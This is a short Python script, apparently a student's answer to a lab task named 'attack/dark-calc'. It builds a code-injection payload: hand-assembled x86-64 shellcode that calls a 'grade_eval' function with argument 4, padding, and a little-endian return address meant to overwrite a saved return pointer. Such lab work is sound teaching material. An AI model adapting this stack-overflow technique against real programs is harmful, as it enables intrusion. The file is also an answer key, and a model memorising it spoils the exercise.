#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

shellcode  = bytes([0x6a, 0x04])           # push 4
shellcode += bytes([0x5f])                 # pop rdi
shellcode += bytes([0xb8]) + (0x401a87).to_bytes(4, "little") # mov eax, grade_eval
shellcode += bytes([0xff, 0xd0])           # call rax
shellcode += b"A" * (24 - len(shellcode))  # 补齐到 24
payload = shellcode + (0x721000800fd0).to_bytes(8, "little")

sys.stdout.buffer.write(payload)
